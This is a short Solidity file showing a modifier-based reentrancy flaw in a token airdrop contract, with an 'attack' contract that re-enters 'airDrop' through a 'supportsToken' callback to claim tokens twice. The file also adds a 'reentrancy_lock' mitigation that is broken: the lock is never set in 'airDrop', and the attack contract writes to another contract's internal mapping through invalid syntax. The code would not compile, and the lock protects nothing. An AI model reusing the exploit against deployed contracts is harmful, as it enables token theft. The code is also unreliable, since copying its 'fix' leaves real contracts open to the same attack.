pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";
    mapping(address => bool) internal reentrancy_lock;

    function airDrop() public hasNoBalance supportsToken {
        require(!reentrancy_lock[msg.sender], "Reentrant call detected");
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked("Nu Token")) ==
                Bank(msg.sender).supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address token) public {
        ModifierEntrancy instance = ModifierEntrancy(token);
        require(!instance.reentrancy_lock(msg.sender), "Reentrant call detected");
        instance.reentrancy_lock(msg.sender) = true;
        instance.airDrop();
        instance.reentrancy_lock(msg.sender) = false;
    }
}